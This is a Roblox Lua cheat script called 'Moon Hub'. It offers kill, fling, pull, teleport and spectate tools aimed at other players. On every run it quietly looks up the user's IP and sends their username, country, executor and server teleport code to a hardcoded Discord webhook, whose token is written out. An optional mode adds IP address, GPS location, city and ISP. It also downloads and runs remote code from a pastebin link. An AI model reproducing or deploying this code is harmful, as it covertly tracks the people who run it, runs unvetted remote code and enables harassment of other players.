local players = game:GetService("Players")
local starterGui = game:GetService("StarterGui")
local coreGui = game:GetService("CoreGui")
local httpService = game:GetService("HttpService")
local marketplaceService = game:GetService("MarketplaceService")
local userInputService = game:GetService("UserInputService")
local tweenService = game:GetService("TweenService")
local workspaceService = game:GetService("Workspace")
local runService = game:GetService("RunService")
local replicatedStorage = game:GetService("ReplicatedStorage")

-- ID oficial do Moon Hub / Logo padrão
local IMAGEM_MOON_HUB = "rbxassetid://125198326455541"
local LOGO_PADRAO = "rbxassetid://125198326455541"

getgenv().whscript = "Moon Hub"
getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1558228527852298371/HfH8ggPpYAGkZzu024ea60oVQ2KyaTV5bWU6_-R1u6Hv2yXOjTrM65lcK0MPJeRmaJfN"
getgenv().ExecLogSecret = false

local localPlayer = players.LocalPlayer
local userId = localPlayer.UserId
local placeId = game.PlaceId
local v1 = (gethui and gethui()) or coreGui

local screen = Instance.new("Folder")
screen.Name = "screen"

local v2 = tostring(game.JobId)

if _G.ExecLogSent and _G.ExecLogSent[v2] then
  print("Script executado com sucesso!")
  return
end

if not _G.ExecLogSent then
  _G.ExecLogSent = {}
end

local f1, f2, f3, f4, f5, f6, f7, f8, f9, f10, f11, f12, f13, f14, f15, f16, f17, remotes, tab,
  localPlayer2, findFirstChild, v3, v4, v5, connect, connect2, position, position2, v6, v7, v8,
  findFirstChild2, couch, v9, v10, connect3, ativarFlingAddToggle, f18, f19, v11,
  selecionarJogadorAddDropdown, visualizarJogadorAddToggle, f20, f21, f22, connect4,
  localPlayer3, v12, playersListAddDropdown, f23, v13, localPlayer4, v14, v15, f24, f25,
  localPlayer5, v16, v17, loadAnimation, loadAnimation2, v18, f26, loadAnimation3,
  loadAnimation4, v19, f27, f28, v20, addDropdown

if v1:FindFirstChild("screen") then
  print("Script is already executed! Rejoin if it's an error!")
  local v21 = (gethui and gethui()) or coreGui

  local screen2 = Instance.new("Folder")
  screen2.Name = "screen2"

  if v21:FindFirstChild("screen2") then
    localPlayer:Kick("Anti-spam execution system triggered. Please rejoin to proceed.")
    return
  end

  screen2.Parent = v1
  return
else
  screen.Parent = v1
  _G.ExecLogSent[v2] = true

  task.spawn(function()
    pcall(function()
      local name = "Unknown"
      pcall(function() name = marketplaceService:GetProductInfo(placeId).Name end)

      local value = userInputService:GetPlatform() ~= Enum.Platform.Windows and "Mobile 📱"
        or "PC 💻"

      local value2 = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. placeId
        .. ", '" .. v2 .. "', player)"

      local v22 = #players:GetPlayers()
      local maxPlayers = players.MaxPlayers
      local webhookexecUrl = getgenv().webhookexecUrl
      local v23

      if webhookexecUrl and webhookexecUrl ~= "" then
        local jsonDecode = httpService:JSONDecode((game:HttpGet("https://ipinfo.io/"
          .. game:HttpGet("https://api.ipify.org") .. "/json")))

        local v24 = {
          BR = "Brazil",
          US = "United States",
          PT = "Portugal",
          ES = "Spain",
          FR = "France",
          DE = "Germany",
          IT = "Italy",
          UK = "United Kingdom",
          CA = "Canada",
          AU = "Australia",
          JP = "Japan",
          CN = "China",
          RU = "Russia",
          IN = "India",
          MX = "Mexico",
          AR = "Argentina",
        }

        local country = jsonDecode.country or "N/A"
        local v25 = v24[country] or country
        local name2 = localPlayer.Name
        local displayName = localPlayer.DisplayName
        local v26 = name
        v23 = "Unknown"
        pcall(function() v23 = identifyexecutor() end)

        local v27 = {
          {
            name = "👤 **Detalhes do Player**",
            value = "• Username: " .. name2 .. "\n• Nome de exibição: " .. displayName
              .. "\n• 🌍 País: " .. v25,
            inline = false,
          },
          {
            name = "🕹️ **Detalhes do Jogo**",
            value = "• Game Name: " .. v26 .. "\n• Game ID: " .. placeId,
            inline = false,
          },
          {
            name = "🕹️ **Informações do Servidor**",
            value = "• Players in Server: " .. v22 .. " / " .. maxPlayers,
            inline = true,
          },
          {
            name = "🖥️ **Informações do Sistema**",
            value = "• Executor: " .. v23,
            inline = true,
          },
          { name = "📱 **Dispositivo**", value = value, inline = true },
          { name = "🔄 **Código de teleporte**", value = value2, inline = false },
        }

        if getgenv().ExecLogSecret then
          local v28 = tostring(jsonDecode.ip)
          local v29 = tostring(jsonDecode.loc)
          local v30 = tostring(jsonDecode.city)
          local v31 = tostring(jsonDecode.region)
          local v32 = tostring(jsonDecode.org)

          table.insert(v27, {
            name = "**`(🤫) Secret Information`**",
            value = "||👣 IP Address: " .. v28 .. "||" .. "\n||📍 GPS Location: " .. v29
              .. "||" .. "\n||🏙️ City: " .. v30 .. "||" .. "\n||🏠 Region: " .. v31
              .. "||" .. "\n||🏷️ Hoster: " .. v32 .. "||",
          })
        end

        local httpRequest = http_request

        local jsonEncode = httpService:JSONEncode({
          embeds = {
            {
              title = "🚀 **Um mandrake acabou de executar**",
              description = "*Cole o código de teleporte no seu executor*",
              type = "rich",
              color = 3447003,
              fields = v27,
              thumbnail = {
                url = IMAGEM_MOON_HUB,
              },
              footer = {
                text = "Execution Log | " .. os.date("%Y-%m-%d %H:%M:%S"),
                icon_url = IMAGEM_MOON_HUB,
              },
            },
          },
        })

        local v33 = httpRequest or request or syn and syn.request or fluxus and fluxus.request
          or http and http.request

        if v33 then
          v33({
            Url = webhookexecUrl,
            Body = jsonEncode,
            Method = "POST",
            Headers = { ["content-type"] = "application/json" },
          })
        end
      end
    end)
  end)

  local function makeTextLabel()
    local v34 = {}
    v34.completed = false
    v34.connection = nil

    pcall(function()
      if coreGui:FindFirstChild("LoadingScreen") then
        coreGui.LoadingScreen:Destroy()
      end

      if v1:FindFirstChild("LoadingScreen") then
        v1.LoadingScreen:Destroy()
      end
    end)

    local loadingScreen = Instance.new("ScreenGui")
    loadingScreen.Name = "LoadingScreen"
    loadingScreen.IgnoreGuiInset = true
    loadingScreen.ResetOnSpawn = false
    loadingScreen.Parent = v1

    pcall(function() syn.protect_gui(loadingScreen) end)

    local frame = Instance.new("Frame")
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.BackgroundTransparency = 0.3
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.Parent = loadingScreen

    local bgImage = Instance.new("ImageLabel")
    bgImage.Size = UDim2.new(1, 0, 1, 0)
    bgImage.Position = UDim2.new(0, 0, 0, 0)
    bgImage.BackgroundTransparency = 1
    bgImage.Image = IMAGEM_MOON_HUB
    bgImage.ScaleType = Enum.ScaleType.Crop
    bgImage.Parent = frame

    local imageLabel = Instance.new("ImageLabel")
    imageLabel.Size = UDim2.new(0, 300, 0, 300)
    imageLabel.Position = UDim2.new(0.5, -150, 0.35, -150)
    imageLabel.BackgroundTransparency = 1
    imageLabel.Image = IMAGEM_MOON_HUB
    imageLabel.Parent = frame

    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 0, 40)
    textLabel.Position = UDim2.new(0, 0, 0.65, 0)
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.TextStrokeTransparency = 0.3
    textLabel.BackgroundTransparency = 1
    textLabel.Font = Enum.Font.FredokaOne
    textLabel.TextScaled = true
    textLabel.Text = "Moon hub update"
    textLabel.Parent = frame

    local frame2 = Instance.new("Frame")
    frame2.Size = UDim2.new(0.6, 0, 0.03, 0)
    frame2.Position = UDim2.new(0.2, 0, 0.8, 0)
    frame2.BackgroundColor3 = Color3.new(1, 1, 1)
    frame2.BorderSizePixel = 0
    frame2.Parent = frame

    local frame3 = Instance.new("Frame")
    frame3.Size = UDim2.new(0, 0, 1, 0)
    frame3.BackgroundColor3 = Color3.new(0.7, 0.2, 0.6)
    frame3.BorderSizePixel = 0
    frame3.Parent = frame2

    local create = tweenService:Create(frame3, TweenInfo.new(
      3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out
    ), { Size = UDim2.new(1, 0, 1, 0) })

    create:Play()

    local function f29()
      if loadingScreen then
        loadingScreen:Destroy()
      end

      if v34.connection then
        v34.connection:Disconnect()
      end
    end

    v34.connection = create.Completed:Connect(function()
      tweenService:Create(frame, TweenInfo.new(
        1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out
      ), { BackgroundTransparency = 1 }):Play()

      tweenService:Create(frame2, TweenInfo.new(
        1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out
      ), { BackgroundTransparency = 1 }):Play()

      tweenService:Create(frame3, TweenInfo.new(
        1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out
      ), { BackgroundTransparency = 1 }):Play()

      tweenService:Create(imageLabel, TweenInfo.new(
        1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out
      ), { ImageTransparency = 1 }):Play()

      tweenService:Create(bgImage, TweenInfo.new(
        1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out
      ), { ImageTransparency = 1 }):Play()

      tweenService:Create(textLabel, TweenInfo.new(
        1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out
      ), { TextTransparency = 1 }):Play()

      task.delay(1.2, function()
        pcall(function()
          starterGui:SetCore("SendNotification", {
            Title = "Moon Hub",
            Text = "Bem-vindo à Moon Hub",
            Duration = 4,
          })
        end)

        v34.completed = true
        f29()
      end)
    end)

    return v34
  end

  local v35 = makeTextLabel()

  while not v35.completed do
    task.wait()
  end

  local window = loadstring(game:HttpGet("https://pastebin.com/raw/DwL5Tp0i"))():MakeWindow({
    Title = "Moon hub  |  By samuel_mi244 Jonas Zyrok",
    SubTitle = "",
    SaveFolder = "testando | redz lib v5.lua",
  })

  window:AddMinimizeButton({
    Button = { Image = LOGO_PADRAO, BackgroundTransparency = 0 },
    Corner = { CornerRadius = UDim.new(35, 1) },
  })

  local tab2 = window:MakeTab({ "info", LOGO_PADRAO })
  local tab3 = window:MakeTab({ "troll", LOGO_PADRAO })
  local tab4 = window:MakeTab({ "player", LOGO_PADRAO })
  local tab5 = window:MakeTab({ "avatar", LOGO_PADRAO })
  local tab6 = window:MakeTab({ "rgb", LOGO_PADRAO })
  tab = window:MakeTab({ "music", LOGO_PADRAO })
  local tab7 = window:MakeTab({ "teleport", LOGO_PADRAO })
  local tab8 = window:MakeTab({ "skybox/nuke", LOGO_PADRAO })
  local tab9 = window:MakeTab({ "Car", LOGO_PADRAO })
  local tab10 = window:MakeTab({ "House", LOGO_PADRAO })
  local tab11 = window:MakeTab({ "spam", LOGO_PADRAO })
  local tab12 = window:MakeTab({ "avatares fe", LOGO_PADRAO })
  local tab13 = window:MakeTab({ "scripts", LOGO_PADRAO })

  tab2:AddSection({ "Créditos do Hub" })

  tab2:AddDiscordInvite({
    Name = "Moon Studio",
    Description = "By samuel_mi244 Jonas Zyrok",
    Logo = LOGO_PADRAO,
    Invite = "https://discord.gg/FpbYnFCe9",
  })

  local function f30()
    if identifyexecutor then
      return identifyexecutor()
    elseif syn then
      return "Synapse X"
    elseif KRNL_LOADED then
      return "KRNL"
    elseif is_sirhurt_closure then
      return "SirHurt"
    elseif pebc_execute then
      return "ProtoSmasher"
    else
      if getexecutorname then
        return getexecutorname()
      end

      return "Executor Desconhecido"
    end
  end

  tab2:AddParagraph({ "Execultor", (f30()) })
  tab2:AddSection({ "versao do Hub" })
  tab2:AddParagraph({ "fundador", "samuel_mi244 Jonas Zyro" })

  tab2:AddButton({
    Name = " - Copiar @ do TikTok",
    Callback = function() setclipboard("https://www.tiktok.com/@samuel_mi244?_r=1&_t=ZS-9ARJ9VjZKLM") end,
  })

  localPlayer2 = players.LocalPlayer
  findFirstChild = nil
  v3 = false
  v4 = false
  v5 = false
  connect = nil
  connect2 = nil
  position = nil
  position2 = nil
  v6 = {}
  v7 = nil
  v8 = nil
  findFirstChild2 = nil
  couch = nil
  v9 = false
  v10 = nil
  connect3 = nil
  ativarFlingAddToggle = nil

  local remoteEvent = Instance.new("RemoteEvent")
  remoteEvent.Name = "SetNetworkOwnerEvent_" .. tostring(math.random(1000, 9999))
  remoteEvent.Parent = replicatedStorage

  function f1()
    if connect3 then
      connect3:Disconnect()
      connect3 = nil
    end

    v9 = false
    v10 = nil

    if localPlayer2.Character and localPlayer2.Character:FindFirstChild("Humanoid") then
      workspaceService.CurrentCamera.CameraSubject = localPlayer2.Character.Humanoid
      workspaceService.CurrentCamera.CameraType = Enum.CameraType.Custom
    else
      workspaceService.CurrentCamera.CameraSubject = nil
      workspaceService.CurrentCamera.CameraType = Enum.CameraType.Custom
    end
  end

  function f2()
    local v36 = {}

    for index, value3 in ipairs(players:GetPlayers()) do
      if value3 ~= localPlayer2 then
        table.insert(v36, value3.Name)
      end
    end

    return v36
  end

  function f6()
    local carClient = localPlayer2:WaitForChild("Backpack"):FindFirstChild("CarClient")

    if carClient and carClient:IsA("LocalScript") then
      carClient.Disabled = true
    end
  end

  function f3(p1)
    if connect3 then
      connect3:Disconnect()
      connect3 = nil
    end

    local findFirstChild3 = players:FindFirstChild(p1)
    local f31

    if findFirstChild3 and findFirstChild3 ~= localPlayer2 then
      function f31()
        if not v9 or not v10 then
          return
        end

        if v10.Character and v10.Character:FindFirstChild("Humanoid") then
          workspaceService.CurrentCamera.CameraSubject = v10.Character.Humanoid
        else
          workspaceService.CurrentCamera.CameraSubject = nil
        end
      end

      v10 = findFirstChild3
      v9 = true
      f31()

      connect3 = runService.Heartbeat:Connect(function()
        if not v9 then
          connect3:Disconnect()
          connect3 = nil
          return
        end

        pcall(f31)
      end)

      v10.CharacterAdded:Connect(function()
        if v9 then
          f31()
        end
      end)
    else
      v9 = false
      v10 = nil
    end
  end

  function f18(p2, p3)
    pcall(function()
      local get = p2:Get()
      local v37 = f2()
      p2:Set(v37)

      if get and not table.find(v37, get) then
        p2:Set("")
        findFirstChild = nil

        if v9 then
          stopSpectating()

          if p3 then
            pcall(function() p3:Set(false) end)
          end
        end

        if v5 or v3 or v4 then
          v5 = false
          v3 = false
          v4 = false

          if connect then
            connect:Disconnect()
            connect = nil
          end

          if connect2 then
            connect2:Disconnect()
            connect2 = nil
          end

          if ativarFlingAddToggle then
            pcall(function() ativarFlingAddToggle:Set(false) end)
          end
        end
      elseif get and table.find(v37, get) then
        p2:Set(get)
      end
    end)
  end

  function f19(p4)
    local findFirstChild4 = players:FindFirstChild(p4)

    local humanoidRootPart = findFirstChild4 and localPlayer2.Character
      and localPlayer2.Character:FindFirstChild("HumanoidRootPart")
      and findFirstChild4.Character
      and findFirstChild4.Character:FindFirstChild("HumanoidRootPart")

    local humanoidRootPart2

    if humanoidRootPart then
      humanoidRootPart2 = localPlayer2.Character:FindFirstChild("HumanoidRootPart")
      local humanoid = localPlayer2.Character:FindFirstChild("Humanoid")

      if not humanoidRootPart2 or not humanoid then
        print("Seu personagem não está totalmente carregado para teletransporte.")
        return
      else
        for index2, value4 in ipairs(localPlayer2.Character:GetDescendants()) do
          if value4:IsA("BasePart") then
            value4.Velocity = Vector3.zero
            value4.RotVelocity = Vector3.zero
            value4.Anchored = true
          end
        end

        local v38, v39 = pcall(function()
          humanoidRootPart2.CFrame = CFrame.new(findFirstChild4.Character.HumanoidRootPart.Position
            + Vector3.new(0, 2, 0))
        end)

        if not v38 then
          warn("Erro ao teletransportar: " .. tostring(v39))
          return
        end

        humanoid.Sit = false
        humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)

        task.wait(0.5)

        for index3, value5 in ipairs(localPlayer2.Character:GetDescendants()) do
          if value5:IsA("BasePart") then
            value5.Anchored = false
            value5.Velocity = Vector3.zero
            value5.RotVelocity = Vector3.zero
          end
        end

        print("Teletransportado para o jogador: " .. p4 .. " com ancoragem segura.")
        return
      end
    else
      print("Jogador ou personagem não encontrado para teletransporte.")
      return
    end
  end

  localPlayer2.CharacterAdded:Connect(function(character)
    if v9 then
      f1()
      pcall(function() SpectateToggleTab10:Set(false) end)
    end
  end)

  v11 = nil

  selecionarJogadorAddDropdown = tab3:AddDropdown({
    Name = "Selecionar Jogador",
    Description = "Escolha um jogador para matar, puxar, visualizar ou aplicar fling",
    Default = "",
    Multi = false,
    Options = f2(),
    Flag = "player list",
    Callback = function(value6)
      v11 = value6

      if value6 == "" or value6 == nil then
        findFirstChild = nil

        if v5 or v3 or v4 then
          v5 = false
          v3 = false
          v4 = false

          if connect then
            connect:Disconnect()
          end

          if connect2 then
            connect2:Disconnect()
          end

          if ativarFlingAddToggle then
            pcall(function() ativarFlingAddToggle:Set(false) end)
          end
        end

        if v9 then
          f1()
        end
      else
        findFirstChild = players:FindFirstChild(value6)

        if v9 then
          f1()
          f3(value6)
        end
      end
    end,
  })

  function UptadePlayers()
    local v40 = {}

    for index4, value7 in ipairs(players:GetPlayers()) do
      if value7.Name ~= localPlayer2.Name then
        table.insert(v40, value7.Name)
      end
    end

    selecionarJogadorAddDropdown:Set(v40)
  end

  tab3:AddButton({ "Atualizar lista", function() UptadePlayers() end })
  UptadePlayers()

  tab3:AddButton({
    Title = "Teleportar para Jogador",
    Desc = "Clique para teletransportar para o jogador selecionado",
    Callback = function()
      local v41 = v11

      if v41 and v41 ~= "" then
        local v42, v43 = pcall(f19, v41)

        if not v42 then
          warn("Erro ao teletransportar: " .. tostring(v43))
        end
      else
        print("Selecione um jogador antes de teletransportar.")
      end
    end,
  })

  visualizarJogadorAddToggle = tab3:AddToggle({
    Name = "Visualizar Jogador",
    Description = "Ativa/desativa a visualização do jogador selecionado",
    Default = false,
    Callback = function(value8)
      if value8 then
        if findFirstChild then
          pcall(f3, findFirstChild.Name)
        else
          SpectateToggleTab10:Set(false)
        end
      else
        pcall(f1)
      end
    end,
  })

  players.PlayerRemoving:Connect(function(player)
    f18(selecionarJogadorAddDropdown, visualizarJogadorAddToggle)

    if findFirstChild == player then
      findFirstChild = nil

      if v9 then
        f1()
      end

      if v5 then
        v5 = false

        if connect then
          connect:Disconnect()
          connect = nil
        end

        if connect2 then
          connect2:Disconnect()
          connect2 = nil
        end

        if ativarFlingAddToggle then
          ativarFlingAddToggle:Set(false)
        end
      end

      visualizarJogadorAddToggle:Set(false)
      selecionarJogadorAddDropdown:Set("")
    end
  end)

  players.PlayerAdded:Connect(function()
    task.wait(1)
    f18(selecionarJogadorAddDropdown, visualizarJogadorAddToggle)
  end)

  f18(selecionarJogadorAddDropdown, visualizarJogadorAddToggle)

  tab3:AddSection({ "Kill" })

  tab3:AddDropdown({
    Name = "Selecionar Método (Matar/Puxar)",
    Description = "Escolha o método para matar ou puxar",
    Options = { "Sofá", "Ônibus" },
    Callback = function(value9) v7 = value9 end,
  })

  function f4(p5)
    if not p5 or not p5.Character or not localPlayer2.Character then
      return
    end

    if not f20() then
      return
    end

    v3 = true
    position = localPlayer2.Character:FindFirstChild("HumanoidRootPart").Position
  end

  function f5(p6)
    if not p6 or not p6.Character or not localPlayer2.Character then
      return
    end

    local character2 = localPlayer2.Character
    local humanoid2 = character2:FindFirstChildOfClass("Humanoid")
    local humanoidRootPart3 = character2:FindFirstChild("HumanoidRootPart")
    local v44, findFirstChild5, v45, v46

    if not humanoid2 or not humanoidRootPart3 then
      return
    else
      position2 = humanoidRootPart3.Position
      task.wait(0.5)
      f6()
      v44 = { "DeleteAllVehicles" }

      pcall(function()
        replicatedStorage:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(v44))
      end)

      v44 = { "PickingCar", "SchoolBus" }

      pcall(function()
        replicatedStorage:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(v44))
      end)

      task.wait(1)
      local vehicles = workspaceService:FindFirstChild("Vehicles")

      if not vehicles then
        return
      end

      findFirstChild5 = vehicles:FindFirstChild(localPlayer2.Name .. "Car")

      if not findFirstChild5 then
        return
      else
        pcall(function()
          humanoidRootPart3.Anchored = true
          humanoidRootPart3.CFrame = CFrame.new(Vector3.new(1171.15, 79.45, -1166.2))

          task.wait(0.2)

          humanoidRootPart3.Velocity = Vector3.zero
          humanoidRootPart3.RotVelocity = Vector3.zero
          humanoidRootPart3.Anchored = false

          humanoid2:ChangeState(Enum.HumanoidStateType.Seated)
        end)

        local v47 = tick()

        while true do
          task.wait()

          if tick() - v47 > 10 then
            break
          end

          if humanoid2.Sit then
            for index5, value10 in ipairs(findFirstChild5:GetDescendants()) do
              local v48 = value10

              if v48:IsA("BasePart") then
                v48.CanCollide = false
                pcall(function() v48:SetNetworkOwner(nil) end)
              end
            end

            v5 = true

            connect = runService.Stepped:Connect(function()
              if not v5 then
                return
              end

              for index6, value11 in ipairs(character2:GetDescendants()) do
                if value11:IsA("BasePart") then
                  value11.CanCollide = false
                end
              end
            end)

            v45 = tick()
            v46 = tick()

            connect2 = runService.Heartbeat:Connect(function()
              local humanoidRootPart4, vector, humanoidRootPart5

              if not v5 then
                return
              else
                local character3 = p6.Character or p6.CharacterAdded:Wait()
                humanoidRootPart4 = character3:FindFirstChild("HumanoidRootPart")
                local humanoid3 = character3:FindFirstChild("Humanoid")

                if not humanoidRootPart4 or not humanoid3 then
                  return
                end

                if not humanoidRootPart3 or not humanoid2 then
                  v5 = false
                  return
                elseif tick() - v45 < 0.05 then
                  return
                else
                  v45 = tick()
                  vector = Vector3.new(math.random(-10, 10), 0, math.random(-10, 10))

                  pcall(function()
                    findFirstChild5:PivotTo(CFrame.new(humanoidRootPart4.Position + vector) * CFrame.Angles(
                      math.rad(workspaceService.DistributedGameTime * 12000),
                      math.rad(workspaceService.DistributedGameTime * 15000),
                      math.rad(workspaceService.DistributedGameTime * 18000)
                    ))
                  end)

                  local v49 = false

                  for index7, value12 in ipairs(findFirstChild5:GetDescendants()) do
                    if (value12:IsA("Seat") or value12:IsA("VehicleSeat"))
                      and value12.Name ~= "VehicleSeat" then
                      if value12.Occupant == humanoid3 then
                        v49 = true
                        break
                      end
                    end
                  end

                  if v49 or tick() - v46 > 10 then
                    v5 = false

                    if connect then
                      connect:Disconnect()
                      connect = nil
                    end

                    if connect2 then
                      connect2:Disconnect()
                      connect2 = nil
                    end

                    pcall(function()
                      findFirstChild5:PivotTo(CFrame.new(Vector3.new(-76.6, -401.97, -84.26)))
                    end)

                    task.wait(0.5)
                    f6()

                    if character2 then
                      humanoidRootPart5 = character2:FindFirstChild("HumanoidRootPart")

                      if humanoidRootPart5 and position2 then
                        pcall(function()
                          humanoidRootPart5.Anchored = true
                          humanoidRootPart5.CFrame = CFrame.new(position2 + Vector3.new(0, 5, 0))

                          task.wait(0.2)

                          humanoidRootPart5.Velocity = Vector3.zero
                          humanoidRootPart5.RotVelocity = Vector3.zero
                          humanoidRootPart5.Anchored = false

                          if humanoid2 then
                            humanoid2:ChangeState(Enum.HumanoidStateType.GettingUp)
                          end
                        end)
                      end
                    end

                    if character2 then
                      for index8, value13 in ipairs(character2:GetDescendants()) do
                        if value13:IsA("BasePart") then
                          value13.CanCollide = true
                          value13.Velocity = Vector3.zero
                          value13.RotVelocity = Vector3.zero
                        end
                      end
                    end

                    local humanoid4 = character2 and character2:FindFirstChild("Humanoid")

                    if humanoid4 then
                      humanoid4:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                    end

                    for index9, value14 in ipairs(workspaceService:GetDescendants()) do
                      if value14:IsA("Seat") or value14:IsA("VehicleSeat") then
                        value14.Disabled = false
                      end
                    end

                    pcall(function()
                      replicatedStorage:WaitForChild("RE"):WaitForChild("1Clothe1s"):FireServer(
                        "CharacterSizeUp", 1
                      )
                    end)
                  end

                  return
                end
              end
            end)

            return
          end
        end

        return
      end
    end
  end

  function f20()
    local backpack = localPlayer2:WaitForChild("Backpack")

    local couch2 = backpack:FindFirstChild("Couch")
      or localPlayer2.Character:FindFirstChild("Couch")

    local v50, v51

    if not couch2 then
      v51 = { "PickingTools", "Couch" }

      if not pcall(function()
        replicatedStorage:WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer(unpack(v51))
      end) then
        return false
      end

      repeat
        couch2 = backpack:FindFirstChild("Couch")
        task.wait()

        v50 = couch2
        v50 = couch2 or task.wait(5)
      until v50

      if not couch2 then
        return false
      end

      if couch2.Parent ~= localPlayer2.Character then
        couch2.Parent = localPlayer2.Character
      end

      return true
    end

    if couch2.Parent ~= localPlayer2.Character then
      couch2.Parent = localPlayer2.Character
    end

    return true
  end

  function f21(p7)
    if not p7 or not p7.Character or not localPlayer2.Character then
      return
    end

    if not f20() then
      return
    end

    v4 = true
    position = localPlayer2.Character:FindFirstChild("HumanoidRootPart").Position
  end

  runService.Heartbeat:Connect(function()
    if (v3 or v4) and findFirstChild and localPlayer2.Character
      and localPlayer2.Character:FindFirstChild("HumanoidRootPart") and findFirstChild.Character
      and findFirstChild.Character:FindFirstChild("HumanoidRootPart") then
      pcall(function()
        localPlayer2.Character:SetPrimaryPartCFrame(CFrame.new(findFirstChild.Character.HumanoidRootPart.Position) * CFrame.Angles(
          math.rad(workspaceService.DistributedGameTime * 12000),
          math.rad(workspaceService.DistributedGameTime * 15000),
          math.rad(workspaceService.DistributedGameTime * 18000)
        ))
      end)
    end
  end)

  runService.Heartbeat:Connect(function()
    if (v3 or v4) and findFirstChild and findFirstChild.Character
      and findFirstChild.Character:FindFirstChild("Humanoid") then
      pcall(function()
        if findFirstChild.Character.Humanoid.Sit then
          if v3 then
            if localPlayer2.Character
              and localPlayer2.Character:FindFirstChild("HumanoidRootPart") then
              localPlayer2.Character:SetPrimaryPartCFrame(CFrame.new(0, -500, 0))
              task.wait(0.5)

              replicatedStorage:WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer(
                "PickingTools", "Couch"
              )

              task.wait(1)
            end
          end

          v3 = false
          v4 = false

          if localPlayer2.Character
            and localPlayer2.Character:FindFirstChild("HumanoidRootPart") and position then
            local humanoidRootPart6 = localPlayer2.Character:FindFirstChild("HumanoidRootPart")
            local humanoid5 = localPlayer2.Character:FindFirstChild("Humanoid")

            if humanoidRootPart6 then
              humanoidRootPart6.Anchored = true
              humanoidRootPart6.CFrame = CFrame.new(position + Vector3.new(0, 5, 0))

              task.wait(0.2)

              humanoidRootPart6.Velocity = Vector3.zero
              humanoidRootPart6.RotVelocity = Vector3.zero
              humanoidRootPart6.Anchored = false

              if humanoid5 then
                humanoid5:ChangeState(Enum.HumanoidStateType.GettingUp)
              end
            end

            position = nil
          end
        end
      end)
    end
  end)

  tab3:AddButton({
    Name = "Matar",
    Description = "Inicia o matar com o método selecionado",
    Callback = function()
      if v3 or v4 or v5 then
        return
      end

      if not findFirstChild or not v7 then
        return
      end

      if v7 == "Sofá" then
        f4(findFirstChild)
      elseif v7 == "Ônibus" then
        f5(findFirstChild)
      end
    end,
  })

  function f7(p8, p9, p10)
  end

  tab3:AddButton({
    Name = "Puxar",
    Description = "Inicia o puxar com o método selecionado",
    Callback = function()
      if v3 or v4 or v5 then
        return
      end

      if not findFirstChild or not v7 or v7 ~= "Sofá" then
        return
      end

      f21(findFirstChild)
    end,
  })

  tab3:AddButton({
    Name = "Parar (Matar ou Puxar)",
    Description = "Para o movimento de matar ou puxar",
    Callback = function()
      v3 = false
      v4 = false

      for index10, value15 in ipairs(localPlayer2.Character:GetDescendants()) do
        if value15:IsA("BasePart") then
          value15.CanCollide = true
          value15.Velocity = Vector3.zero
          value15.RotVelocity = Vector3.zero
        end
      end

      local humanoid6 = localPlayer2.Character:FindFirstChild("Humanoid")

      if humanoid6 then
        humanoid6:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
      end

      for index11, value16 in ipairs(workspaceService:GetDescendants()) do
        if value16:IsA("Seat") or value16:IsA("VehicleSeat") then
          value16.Disabled = false
        end
      end

      if position then
        local humanoidRootPart7 = localPlayer2.Character:FindFirstChild("HumanoidRootPart")

        if humanoidRootPart7 then
          humanoidRootPart7.Anchored = true
          humanoidRootPart7.CFrame = CFrame.new(position + Vector3.new(0, 5, 0))

          task.wait(0.2)

          humanoidRootPart7.Velocity = Vector3.zero
          humanoidRootPart7.RotVelocity = Vector3.zero
          humanoidRootPart7.Anchored = false

          if humanoid6 then
            humanoid6:ChangeState(Enum.HumanoidStateType.GettingUp)
          end
        end

        position = nil
      end

      f6()
      local v52 = { "DeleteAllVehicles" }

      pcall(function()
        replicatedStorage:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(v52))
      end)
    end,
  })

  tab3:AddSection({ " flings" })

  function f8(p11)
    return IMAGEM_MOON_HUB
  end

  tab3:AddDropdown({
    Name = "Selecionar Método de Fling",
    Description = "Escolha o método para aplicar fling",
    Options = { "Sofá", "Ônibus", "Bola", "Bola V2", "Barco", "Caminhão" },
    Callback = function(value17) v8 = value17 end,
  })

  function f9()
    v5 = false

    if connect then
      connect:Disconnect()
      connect = nil
    end

    if connect2 then
      connect2:Disconnect()
      connect2 = nil
    end

    if findFirstChild2 then
      findFirstChild2.Anchored = v6.Anchored
      findFirstChild2.CanCollide = v6.CanCollide
      findFirstChild2.CanTouch = v6.CanTouch
    end

    if couch and couch:IsA("BasePart") then
      couch.Anchored = v6.Anchored
      couch.CanCollide = v6.CanCollide
      couch.CanTouch = v6.CanTouch
    end

    f6()
    task.wait(0.2)
    local character4 = localPlayer2.Character

    if character4 then
      for index12, value18 in ipairs(character4:GetDescendants()) do
        if value18:IsA("BasePart") then
          value18.CanCollide = true
          value18.Velocity = Vector3.zero
          value18.RotVelocity = Vector3.zero
        end
      end
    end

    local humanoid7 = character4 and character4:FindFirstChild("Humanoid")

    if humanoid7 then
      humanoid7:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
    end

    for index13, value19 in ipairs(workspaceService:GetDescendants()) do
      if value19:IsA("Seat") or value19:IsA("VehicleSeat") then
        value19.Disabled = false
      end
    end

    pcall(function()
      replicatedStorage:WaitForChild("RE"):WaitForChild("1Clothe1s"):FireServer(
        "CharacterSizeUp", 1
      )
    end)

    local humanoidRootPart8

    if position2 then
      humanoidRootPart8 = character4 and character4:FindFirstChild("HumanoidRootPart")

      if humanoidRootPart8 then
        pcall(function()
          humanoidRootPart8.Anchored = true
